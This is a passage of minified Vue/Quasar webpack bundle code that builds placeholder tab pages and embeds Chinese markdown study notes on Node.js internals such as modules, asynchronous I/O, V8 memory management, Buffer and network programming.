n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"54f6c280",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"2b02a9c1",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"010e9102",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"51cb0f7a",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"58306039",null);r["default"]=an.exports},"8e7f":function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"0abafd36",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"ccff9720",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"cdfea214",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"6f0c9637",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"45187d78",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"1b2464b9",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"1d9f680c",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"7187998a",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"3d50bcb2",null);r["default"]=an.exports},9227:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"2415d40c",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"74ec34fb",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"bb9ca26a",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"783d960c",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"4e497d4d",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"2455648e",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"0b3d6862",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"5f2599e0",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"24e2967e",null);r["default"]=an.exports},a210:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("q-tabs",{staticClass:"text-teal",attrs:{align:"left","inline-label":"",dense:""},model:{value:n.tab,callback:function(r){n.tab=r},expression:"tab"}},n._l(n.tabs,(function(n,r){return t("q-tab",{key:"tabs_"+r,attrs:{name:""+(r+1),label:r+1+"."+n.text}})})),1),t("m"+n.tab,{tag:"component"})],1)},a=[],i=t("9523"),s=t.n(i),o=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n   rrrrrrrrrrrrrrrrrrrr\n")])},l=[],c={},p=c,u=t("2877"),m=Object(u["a"])(p,o,l,!1,null,"12710b2c",null),d=m.exports,g=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    yyyyyyyyyyyyyyyyyyyyyyyy\n")])},b=[],v={},h=v,S=Object(u["a"])(h,g,b,!1,null,"4df3af09",null),y=S.exports,f=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},_=[],x={},w=x,E=Object(u["a"])(w,f,_,!1,null,"cdaa2706",null),T=E.exports,k=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},C=[],j={},M=j,R=Object(u["a"])(M,k,C,!1,null,"6f36d3be",null),L=R.exports,O=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},A=[],I={},D=I,P=Object(u["a"])(D,O,A,!1,null,"4542baff",null),N=P.exports,q=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},H=[],B={},F=B,U=Object(u["a"])(F,q,H,!1,null,"1b4ea240",null),J=U.exports,z=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},W=[],$={},G=$,V=Object(u["a"])(G,z,W,!1,null,"1d4aecfe",null),Q=V.exports,K=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[n._v("\n    1\n")])},X=[],Y={},Z=Y,nn=Object(u["a"])(Z,K,X,!1,null,"71331e7c",null),rn=nn.exports,tn={components:{m1:d,m2:y,m3:T,m4:L,m5:N,m6:J,m7:Q,m8:rn},data:function(){return s()({tab:1,tabs:[1,2,3,4,5,6,7,8]},"tabs",[{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"},{text:"未开发"}])}},en=tn,an=Object(u["a"])(en,e,a,!1,null,"40c4daf8",null);r["default"]=an.exports},b047:function(n,r,t){"use strict";var e=t("fa2e"),a=t.n(e);a.a},bbaf:function(n,r,t){"use strict";t.r(r);var e=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("div",{staticClass:"q-mx-lg"},[t(""+n.tab,{tag:"component"})],1)])},a=[],i=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},s=[],o="# node\r\n\r\n## 模块机制\r\n\r\n### CommonJS 规范\r\n\r\n- CommonJS 规范\r\n\r\n\t- 模块引用\r\n\t- 模块定义\r\n\t- 模块标识\r\n\r\n- 规范涵盖了模块\r\n\r\n\t- 二进制\r\n\t- Buffer\r\n\t- 字符集编码\r\n\t- I/O流\r\n\t- 进程环境\r\n\t- 文件系统\r\n\t- 套接字\r\n\t- 单元测试\r\n\t- Web服务器网关接口\r\n\t-  包管理\r\n\r\n### Node 的模块实现\r\n\r\n- 模块\r\n\r\n\t- 核心模块\r\n\t- 文件模块\r\n\t- Node对引入过的模块都会进行缓存,以减少二次引入时的开销\r\n\r\n- 模块标识符分析\r\n\r\n\t- 核心模块\r\n\t- 路径形式的文件模块\r\n\t- 自定义模块\r\n\r\n- 模块路径分析\r\n\r\n\t- Node在定位文件模块的具体文件时制定的查找策略,具体表现为一个路径组成的数组\r\n\t- 逐个尝试模块路径中的路径,直到找到目标文件为止\r\n\t- 沿路径向上逐级递归,直到根目录下的node_modules目录\r\n\r\n- 文件定位\r\n\r\n\t- 文件扩展名分析\r\n\r\n\t\t- Node会按.js、.json、.node的次序补 足扩展名,依次尝试\r\n\r\n\t- 目录分析和包\r\n\r\n\t\t- require()通过分析文件扩展名之后,可能没有查找到对应文件，得到一个目录\r\n\r\n- 模块编译\r\n\r\n\t- Node会新建一个模块对 象,然后根据路径载入并编译\r\n\t- .js文件。通过fs模块同步读取文件后编译执行\r\n\t- .node文件。这是用C/C++编写的扩展文件,通过dlopen()方法加载最后编译生成的文件\r\n\t- .json文件。通过fs模块同步读取文件后,用JSON.parse()解析返回结果\r\n\t- 其余扩展名文件。它们都被当做.js文件载入\r\n\t- 在编译的过程中,Node对获取的JavaScript文件内容进行了头尾包装\r\n\t- (function (exports, require, module, __filename, __dirname) {\\n,在尾部添加了\\n});\r\n\r\n### 核心模块\r\n\r\n- 核心模块 其实分为C/C++编写的和JavaScript编写的两部分\r\n\r\n\t- 其中C/C++文件存放在Node项目的src目录下\r\n\t- JavaScript文件存放在lib目录下\r\n\r\n- 1.转存为C/C++代码\r\n\r\n\t- Node采用了V8附带的js2c.py工具,将所有内置的JavaScript代码转换 成C++里的数组\r\n\r\n- 2.编译JavaScript核心模块\r\n\r\n\t- 与文件模块 有区别的地方在于:获取源代码的方式及缓存执行结果的位置\r\n\r\n- 那些由纯C/C++编写的部分统一称为内建模块\r\n- 1. 内建模块的组织形式\r\n\r\n\t- C/C++编写,性能上优于脚本语言\r\n\t- 被直接加载进内存中，无需文件定位编译，可直接执行\r\n\r\n- 2. 内建模块的导出\r\n\r\n\t- Node在启动时,会生成一个全局变量process,并提供Binding()方法来协助加载内建模块。\r\n\r\n### C/C++扩展模块\r\n\r\n- C/C++扩展模块属于文件模块中的一类\r\n- 一个平台下的.node文件在另一个平台下是无法加载执行的，必须重新编译\r\n- 前提条件\r\n\r\n\t- GYP项目生成工具\r\n\t- V8引擎C++库\r\n\t- libuv库\r\n\t- Node内部库\r\n\t- 其他库\r\n\r\n- 模块编写：C/C++扩展模块与内建模块的套路一样,将方法挂载在target对象上,然后通过NODE_MODULE 声明即可\r\n- 模块编译，在GYP工具的帮助下，编译过程会根据平台不同,分别通过make或vcbuild进行编译\r\n- 模块加载：require()方法通过解 析标识符、路径分析、文件定位,然后加载执行即可\r\n\r\n### 模块调用栈\r\n\r\n- JavaScript核心模块\r\n\r\n\t- 作为C/C++内建模块的封装层和桥接层, 供文件模块调用\r\n\t- 纯粹的功能模块\r\n\r\n### 包与 NPM\r\n\r\n- 在模块之外,包和 NPM则是将模块联系起来的一种机制\r\n- 包结构\r\n\r\n\t- 是一个存档文件\r\n\r\n- 包描述文件与NPM\r\n\r\n\t- 用于表达非代码相关的信息,package.json\r\n\r\n- NPM常用功能\r\n\r\n\t- 帮助完成了第三方模块的发布、安装和依赖等\r\n\t- 可以帮助用户快速安装和管理依赖包\r\n\r\n- 局域NPM\r\n\r\n\t- 企业搭建自己的NPM仓库\r\n\t- 享受到模块开发带来的低耦合和项目组织上的好处\r\n\t- 考虑到模块保密性的问题\r\n\r\n- NPM潜在问题\r\n\r\n\t- 包的质量\r\n\t- 安全性\r\n\r\n### 前后端共用模块\r\n\r\n- AMD规范是CommonJS模块规范的一个延伸\r\n- CMD规范与AMD规范的主要区别在于定义模块和依赖引入的部分\r\n\r\n## node简介\r\n\r\n### Node 的诞生历程\r\n\r\n### Node 的命名与起源\r\n\r\n- JavaScript比C的开发门槛要低\r\n- 比Lua的历史包袱要少\r\n- 有广泛的事件驱动方面的应用\r\n- 为其导入非阻塞I/O库 没有额外阻力\r\n- JavaScript引 擎V8摘得性能第一的桂冠\r\n- 为什么叫Node：每一个Node进程都构成这个网络应 用中的一个节点\r\n\r\n### Node 带来的意义\r\n\r\n- Node打破了过去JavaScript只能在浏览器中运行的局面\r\n- 大大降低前后端转换所需要的上下文交换代价\r\n\r\n### Node 的特点\r\n\r\n- 异步I/O\r\n- 事件与回调函数\r\n- 单线程\r\n- 跨平台\r\n\r\n### Node 应用场景\r\n\r\n- I/O密集型\r\n- 是否不擅长CPU密集型业务\r\n- 与遗留系统和平共处\r\n- 分布式应用\r\n\r\n## Cheney算法\r\n\r\n### semispace （From）空间\r\n\r\n- 使用中,对象分配时分配到 From 空间\r\n- 存活对象复制到To空间，空间角色交换\r\n\r\n## 异步I/O\r\n\r\n### 为什么要异步 I/O\r\n\r\n- 在跨网络的结构下,并发已经是现代编程中的标准配备了\r\n- 在浏览器中 JavaScript 执行与 UI 渲染共用一个线程\r\n- 前端通过异步可以消除掉UI阻塞的现象\r\n- 采用异步并发下载资源\r\n- 多线程的代价在于创建 线程和执行期线程上下文切换的开销较大\r\n- 但是串行执行的缺点在于性能\r\n- Node在两者之间给出了它的方案\r\n\r\n\t- 利用单线程,远离多线程死锁、状态同步等问题\r\n\t- 利用异 步I/O,让单线程远离阻塞,以更好地使用CPU\r\n\r\n### 异步 I/O 实现现状\r\n\r\n- 非阻塞I/O跟阻塞I/O的差别为调用之后会立即返回\r\n- 阻塞I/O造成CPU等待浪费\r\n- 非阻塞带来的麻烦却是需要轮询去确 认是否完全完成数据获取\r\n\r\n\t- read\r\n\t- select\r\n\t- poll\r\n\t- epoll\r\n\t- kqueue\r\n\r\n### Node 的异步 I/O\r\n\r\n- 事件循环\r\n\r\n\t- 在进程启动时,Node便会创建事件循环，循环执行事件关联的回调\r\n\r\n- 观察者\r\n\r\n\t- 每个事件循环中有一个或者多个观察者，观察者决定是否要执行事件\r\n\r\n- 请求对象\r\n\r\n\t- 从JavaScript发起调用到内核执行完I/O操作的 过渡过程中的中间对象\r\n\r\n- 执行回调\r\n\r\n\t- 组装好请求对象、送入I/O线程池等待执行,实际上完成了异步I/O的第一部分,回调通知是 第二部分。\r\n\r\n### 非 I/O 的异步 API\r\n\r\n- 定时器\r\n\r\n\t- 实现原理与异步I/O比较类似,只是不需要I/O线程池的参与\r\n\t- 定时器的问题在于,它并非精确的\r\n\r\n- process.nextTick()\r\n\r\n\t- setTimeout(fn, 0) 的 方式较为 浪费性能。 实际上, process.nextTick()方法的操作相对较为轻量\r\n\t- 每次调用process.nextTick()方法,只会将回调函数放入队列中,在下一轮Tick时取出执行\r\n\r\n- setImmediate\r\n\r\n\t- process.nextTick()中的回调函数执行的优先级要高于setImmediate()\r\n\r\n### 事件驱动与高性能服务器\r\n\r\n- 事件驱动的实质,即 通过主循环加事件触发的方式来运行程序\r\n- 事件循环是异步实现的核心,它 与浏览器中的执行模型基本保持了一致\r\n\r\n## 异步编程\r\n\r\n### 函数式编程\r\n\r\n- 高阶函数\r\n\r\n\t- 高阶函数则是可以把函数作为参数,或是将函数作为返回值的函数,\r\n\t- 除了通 常意义的函数调用返回外,还形成了一种后续传递风格\r\n\t- 在自定义事件实例中,通过为相同事件注册不同的回调函数,可以很灵活地处理业务逻辑\r\n\r\n- 偏函数用法\r\n\r\n\t- 通过指定部分参数来产生一个新的定制函数的形式就是偏函数\r\n\r\n### 异步编程的优势与难点\r\n\r\n- 优势\r\n\r\n\t- Node带来的最大特性莫过于基于事件驱动的非阻塞I/O模型\r\n\t- 只要合理利用Node的异步模型与V8的高性能,就可以充分 发挥CPU和I/O资源的优势\r\n\r\n- 难点\r\n\r\n\t- try/catch的功效在此异步编程中不会发挥任何作用\r\n\t- 函数嵌套过深\r\n\t- 阻塞代码\r\n\t- 多线程编程\r\n\t- 异步转同步\r\n\r\n### 异步编程解决方案\r\n\r\n- 事件发布/订阅模式\r\n\r\n\t- 事件发布/订阅模式可以实现一个事件与多 个回调函数的关联,这些回调函数又称为事件侦听器\r\n\r\n- Promise/Deferred模式\r\n\r\n\t- Promise通过封装异步调用,实现了正向用例和反向用例的分离以及逻辑处理延迟,\r\n\r\n- 流程控制库\r\n\r\n\t- 尾触发：需要手工调用才能持续执行后续调用的，关键字 next\r\n\t- 流程控制模块async\r\n\r\n\t\t- 异步的串行执行\r\n\t\t- 异步的并行执行\r\n\t\t- 自动依赖处理\r\n\r\n\t- 流程控制库 Step\r\n\r\n\t\t- 并行任务执行\r\n\t\t- 结果分组\r\n\r\n\t- 异步编程方案wind\r\n\r\n\t\t- 异步任务定义\r\n\t\t- $await()与任务模型\r\n\t\t- 异步方法转换辅助函数\r\n\r\n### 异步并发控制\r\n\r\n- bagpipe的解决方案\r\n\r\n\t- 通过一个队列来控制并发量\r\n\t- 如果当前活跃(指调用发起但未执行回调)的异步调用量小于限定值,从队列中取出执行\r\n\t- 如果活跃调用达到限定值,调用暂时存放在队列中\r\n\t- 每个异步调用结束时,从队列中取出新的异步调用执行\r\n\t- 拒绝模式\r\n\t- 超时控制\r\n\r\n- async的解决方案\r\n\r\n\t- async也提供了一个方法用于处理异步调用的限制:parallelLimit()。\r\n\t- parallelLimit()方法的缺陷在于无法动态地增加并行任务\r\n\r\n## 内存控制\r\n\r\n### v8垃圾回收机制与内存限制\r\n\r\n-  内存问题\r\n\r\n\t- Node是 一个构建在Chrome的JavaScript运行时上的平台\r\n\t- 内存控制正是在海量请求和长时间运行的前提下进行探讨的\r\n\t- 在Node中通过JavaScript 使用内存时就会发现只能使用部分内存（无法操作大内存对象，例如读取2G的文件）\r\n\r\n- V8限制内存的原因\r\n\r\n\t- 开始是为浏览器设置的，不太可能会存在用到大量内存的场景\r\n\t- V8的垃圾回收机制限制，不控制内存会导致垃圾回收时间加长，阻塞 js 线程执行\r\n\r\n- V8 的对象分配\r\n\r\n\t- 在V8中,所有的JavaScript对象都是通过堆来进行分配的\r\n\t- 根据对象的存货时间将内存的垃圾回收进行不同的分代，分别施以高效算法\r\n\t- 老生代中的对象为存活时间较长或常驻内存的对象\r\n\t- 新生代中的对象为存活时间较短的对象\r\n\r\n- V8 的垃圾回收机制\r\n\r\n\t- Scavenge算法：就是通过将存活对象在两个 semispace空间之间进行复制\r\n\t- Mark-Sweep算法：通过标记活对象，清理死亡对象\r\n\t- Mark-Compact算法，将或对象移动到老生代一端，解决内存碎片问题\r\n\t- V8主要使用Mark-Sweep,在空间不足以对从新 生代中晋升过来的对象进行分配时才使用Mark-Compact。\r\n\t- 垃圾回收需要将应用逻辑暂停下来即“全停顿”\r\n\t- 垃圾回收的优化\r\n\r\n\t\t- 拆分全停顿，应用执行一小会，垃圾回收执行一个拆分\r\n\t\t- 延迟清理\r\n\t\t- 增量式整理\r\n\r\n### 高效使用内存\r\n\r\n- 作用域\r\n\r\n\t- 函数执行结束后，函数作用域被销毁，函数作用域中声明的变量也销毁\r\n\t- 全局作用域需要直到 进程退出才能释放\r\n\t- 如果需要释放常驻内 存的对象,可以通过delete操作来删除引用关系。或者将变量重新赋值,让旧的对象脱离引用关系。\r\n\r\n- 闭包\r\n\r\n\t- 作用域链上的对象访问只能向上,这样外部无法向内部访问\r\n\t- 实现外部作用域访问内部作用域中变量的方法叫做闭包\r\n\t- 闭包使得外部作用域对闭包定义的词法作用域有引用，因此词法作用域不会释放，内存也不会释放\r\n\t- 在正常的JavaScript执行中,无法立即回收的内存有闭包和全局变量引用这两种情况\r\n\r\n### 内存指标\r\n\r\n- 进程的内存总共有几部分\r\n\r\n\t- rss 进程的常驻内存部分\r\n\t- 交换区\r\n\t- 文件系统\r\n\r\n- process.memoryUsage() 可以查看内存使用情况\r\n\r\n\t- 堆中的内存用量总是小于进程的常驻内存用量，即内存并非都是通过V8分配的\r\n\r\n- os.totalmem() 可以查看系统的总内存\r\n- os.freemem() 可以查看系统的闲置内存\r\n\r\n### 内存泄露\r\n\r\n- 慎将内存当做缓存\r\n\r\n\t- 在node 中一旦一个对象被缓存起来，就会被放到老生代中\r\n\t- 长期存在的对象会使得垃圾回收扫描整理的时候对这些对象做无用功\r\n\t- 由于模块的缓存机制,模块是常驻老生代的\r\n\t- 采用进程外的缓存,进程自身不存储状态\r\n\r\n- 关注队列外状态\r\n\r\n\t- 一旦消费速度低于生产速度, 将会形成堆积\r\n\t- 启用超时模式时,调用加入到队列中就 开始计时,超时就直接响应一个超时错误\r\n\t- 拒绝模式时,当队列拥塞时,新到来的调用会直 接响应拥塞错误\r\n\r\n### 内存泄露排查\r\n\r\n- node-heapdump\r\n- node-memwatch\r\n- 通过对堆内存进行分析而找到\r\n\r\n### 大内存应用\r\n\r\n- 由于Node的内存限制,操作大文件 也需要小心,好在Node提供了stream模块用于处理大文件。\r\n\r\n## 理解Buffer\r\n\r\n### Buffer 结构\r\n\r\n- Buffer所占用的内存不是通过V8分配的,属于堆外内存\r\n- Buffer受Array类型的影响很大,可以访问length属性得到长度,也可以通过下标访问元素\r\n- Node在内存的使用上应用的是在C++ 层面申请内存、在JavaScript中分配内存的策略\r\n- Node采用了slab动态内存管理分配机制\r\n\r\n### Buffer 的转换\r\n\r\n- 字符串转Buffer\r\n\r\n\t- 通过构造函数转换的Buffer对象,存储的只能是一种编码类型\r\n\t- 一个Buffer对象可以存储不同编码类型的字符串转码的值\r\n\r\n- Buffer转字符串\r\n\r\n\t- Buffer对象的toString()可以将Buffer对象转换为字 符串\r\n\r\n- Buffer不支持的编码类型\r\n\r\n\t- 只有少数的几种编码类型可以 在字符串和Buffer之间转换\r\n\t- Buffer提供了一个isEncoding()函数来判断编码是否支持转换\r\n\t- 对于不支持的编码类型,可以借助Node生态圈中的模块完成转换\r\n\r\n### Buffer 的拼接\r\n\r\n- 乱码是如何产生的\r\n\r\n\t- 文件可读流在读取时会逐个读取Buffer\r\n\t- 对于任意长度的Buffer而言,宽字节字符串都有 可能存在被截断的情况\r\n\r\n- setEncoding()与string_decoder()\r\n\r\n\t- 让data事件中传递的不再是一个Buffer对象,而是编码后的字符串\r\n\t- 可读流对象在内部设置了一个decoder对象,进行Buffer到字符串的解码,然后传递给调用者\r\n\r\n- 正确拼接Buffer\r\n\r\n\t- 正确的拼接方式是用一个数组来存储接收到的所有Buffer片段并记录下所有片段的总长度\r\n\t- 然后调用 Buffer.concat() 方法生成一个合并的Buffer对象\r\n\r\n### Buffer 与性能\r\n\r\n- 通过预先转换静态内容为Buffer对象,可以有效地减少CPU的重复使用,节省服务器资源\r\n- 动态内容和静态内容分离,静态内容部分可以通 过预先转换为Buffer的方式,使性能得到提升\r\n- 尽量只读取Buffer,然后直接传输,不做额外的转换,避免损耗\r\n\r\n## 网络编程\r\n\r\n### 构建TCP 服务\r\n\r\n- 创建 TCP 服务器\r\n\r\n\t- TCP全名为传输控制协议，在OSI模型(由七层组成,分别为物理层、数据链结层、\r\n网络层、 传输层、会话层、表示层、应用层)中属于传输层协议。\r\n\t- 3次握手创建会话\r\n\t- 服务 器端和客户端分别提供一个套接字,这两个套接字共同形成一个连接\r\n\r\n- TCP 服务的事件\r\n\r\n\t- 服务器事件，listening，connection，close，error\r\n\t- 连接事件，data，end，connect，drain，error，close，timeout\r\n\t- TCP针对网络中的小数据包有一定的优化策略:Nagle算法\r\n\r\n### 构建UDP服务\r\n\r\n- UDP\r\n\r\n\t- 在 UDP 中,一个套接字可以与多个 UDP 服务通信\r\n\t- UDP 又称用户数据包协议,与 TCP 一样同属于网络传输层\r\n\t- 无须连接,资源消耗低,处理快速且灵活\r\n\r\n- 若想让UDP套接字接收网络消息,只要调用dgram.bind(port, [address])方法对网卡和端口 进行绑定即可\r\n- UDP 是一个EventEmitter的实例,而非Stream 的实例，具有自定义事件，message，listening，close，error\r\n\r\n### 构建HTTP服务\r\n\r\n- HTTP\r\n\r\n\t- HTTP的全称是超文本传输协议\r\n\t- HTTP构建在TCP之上,属于应用层协议\r\n\r\n- HTTP报文\r\n\r\n\t- 第一部分内容为经典的 TCP的3次握手过程\r\n\t- 第二部分是在完成握手之后,客户端向服务器端发送请求报文\r\n\t- 第三部分是服务器端完成处理后,向客户端发送响应内容,包括响应头和响应体\r\n\t- 最后部分是结束会话的信息\r\n\r\n- HTTP客户端事件，response，socket，connect，upgrade，protocols，continue\r\n\r\n### 构建 WebSocket 服务\r\n\r\n- WebSocket\r\n\r\n\t- WebSocket客户端基于事件的编程模型与Node中自定义事件相差无几\r\n\t- WebSocket实现了客户端与服务器端之间的长连接\r\n\t- 客户端与服务器端只建立一个TCP连接,可以使用更少的连接。\r\n\t- WebSocket服务器端可以推送数据到客户端\r\n\t- 有更轻量级的协议头,减少数据传送量\r\n\r\n- WebSocket握手\r\n\r\n\t- upgrade\r\n\t- 切换协议\r\n\r\n- WebSocket数据传输\r\n\r\n\t- 为了安全考虑,客户端需要对发送的数据帧进行掩码处理\r\n\r\n### 网络服务与安全\r\n\r\n- SSL作为一种安全协议,它在传输层提供对网络连接加密的功能\r\n- Node在网络安全模块\r\n\r\n\t- crypto\r\n\r\n\t\t- 主要用于加 密解密,SHA1、MD5等加密算法都在其中有体现,\r\n\r\n\t- tls\r\n\r\n\t\t- TLS/SSL是一个公钥/私钥的结构,它是一个非对称的结构\r\n\t\t- 公钥用来加密要传输的数据,私钥用来解密接收到的数据\r\n\t\t- 为了防止中间人攻击,TLS/SSL引入了数字证书来进行认证\r\n\t\t- 创建服务器端\r\n\r\n\t\t\t- 创建一个安全的TCP服务\r\n\t\t\t- 测试证书是否正常\r\n\r\n\t\t- TLS客户端\r\n\r\n\t\t\t- 启动客户端的过程中,用到了为客户端生成的私钥、证书、CA证书\r\n\r\n\t- https\r\n\r\n\t\t- HTTPS服务就是工作在TLS/SSL上的HTTP\r\n\t\t- 1. 准备证书\r\n\t\t- 2. 创建HTTPS服务\r\n\t\t- 3. HTTPS客户端\r\n\r\n## 构建Web应用\r\n\r\n### 基础功能\r\n\r\n- 请求方法\r\n\r\n\t- 最常见的请求方法是GET和POST,除此之外,还有HEAD、DELETE、PUT、CONNECT 等方法\r\n\t- PUT代表新建一个资源,POST表示要更新一个资源,GET表示查看一个资源, 而DELETE表示删除一个资源\r\n\r\n- 路径解析\r\n\r\n\t- 客户端代理(浏览器)会将这个地址解析成报文,将路径和查询部分放在报文第一行\r\n\r\n- 查询字符串\r\n\r\n\t- 这个字符串会跟随在路径后,形成请求报文首行的第二部分\r\n\r\n- Cookie\r\n\r\n\t- 能记录服务器与客户端之间的状态\r\n\t- 设置的Cookie过多,将会导致报头较 大\r\n\r\n\t\t- 减小Cookie的大小\r\n\t\t- 为静态组件使用不同的域名\r\n\t\t- 减少DNS查询\r\n\r\n\t- path\r\n\t- Expires和Max-Age是\r\n\t- HttpOnly\r\n\t- Secure\r\n\r\n- Session\r\n\r\n\t- Session的数据只保留在服务器端,客户 端无法修改\r\n\t- 基于Cookie来实现用户和数据的映射\r\n\t- 通过查询字符串来实现浏览器端和服务器端数据的对应\r\n\r\n- 缓存\r\n\r\n\t- 设置缓存\r\n\r\n\t\t- 添加Expires 或Cache-Control 到报文头中\r\n\t\t- 配置 ETags\r\n\t\t- 让Ajax 可缓存\r\n\r\n\t- 清除缓存\r\n\r\n\t\t- 路径中跟随Web应用的版本号\r\n\t\t- 路径中跟随该文件内容的hash值\r\n\r\n- Basic认证\r\n\r\n\t- 当客户端与服务器端进行请求时,允许通过用户名和密码实现的一种身份认证 方式\r\n\r\n### 数据上传\r\n\r\n- 表单数据\r\n\r\n\t- Content-Type: application/x-www-form-urlencoded\r\n\r\n- 其他格式\r\n\r\n\t- JSON类型的值为 Content-Type：application/json\r\n\t- XML的值为 Content-Type：application/xml\r\n\r\n- 附件上传\r\n\r\n\t- Content-Type: multipart/form-data\r\n\r\n- 数据上传与安全\r\n\r\n\t- 内存限制\r\n\r\n\t\t- 